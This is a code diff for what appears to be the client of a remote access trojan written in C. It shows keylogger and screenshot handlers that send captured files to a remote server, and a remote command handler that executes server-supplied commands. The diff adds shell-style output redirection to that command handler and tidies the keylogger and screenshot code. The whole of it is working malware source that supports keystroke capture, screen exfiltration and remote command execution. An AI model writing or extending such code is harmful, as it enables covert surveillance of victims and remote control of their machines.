@@ -104,6 +104,7 @@ void handleKeyLoggerOpcode()
         sendMessage(clientData.serverSocket, &msg);
         clientData.keyLoggerTid = -1;
         clientData.isKeyLoggerActive = 0;
+        close(clientData.keyLoggerFd);
     }
     else
     {
@@ -147,7 +148,6 @@ void handleScreenshotOpcode()
         msg.size = strlen(msg.buffer);
         sendMessage(clientData.serverSocket, &msg);
     }
-    printf("File created. sending file...\n");
     sendFile(clientData.serverSocket, filename);
 
     remove(filename);
@@ -167,6 +167,47 @@ void expandTilde(char **args)
             sprintf(expanded, "%s%s", home, args[i] + 1);
             args[i] = expanded;
         }
+    }
+}
+
+void expandRedirect(char **args)
+{
+    int i = 0;
+    while (args[i] != NULL)
+    {
+        if (strcmp(args[i], ">") == 0)
+        {
+            if (args[i + 1] != NULL)
+            {
+                // Open the file for writing (create if it doesn't exist, truncate if it does)
+                int fd = open(args[i + 1], O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                if (fd == -1)
+                {
+                    perror("Failed to open file for redirection");
+                    exit(EXIT_FAILURE);
+                }
+
+                // Redirect stdout to the file using dup2
+                if (dup2(fd, STDOUT_FILENO) == -1)
+                {
+                    perror("Failed to redirect output");
+                    exit(EXIT_FAILURE);
+                }
+
+                // Close the file descriptor as it's no longer needed (dup2 has duplicated it)
+                close(fd);
+
+                // Remove the ">" and the filename from the arguments
+                args[i] = NULL; // Terminate the arguments list at the redirection symbol
+                break;
+            }
+            else
+            {
+                fprintf(stderr, "No output file specified for redirection\n");
+                exit(EXIT_FAILURE);
+            }
+        }
+        i++;
     }
 }
 
@@ -195,8 +236,7 @@ void handleCommandOpcode(message_t msg)
         }
         args[i] = NULL;
         expandTilde(args);
-        printf("%s %s", args[0], args[1]);
-        fflush(0);
+        expandRedirect(args);
         execvp(args[0], args);
         perror("Command");
         exit(EXIT_FAILURE);
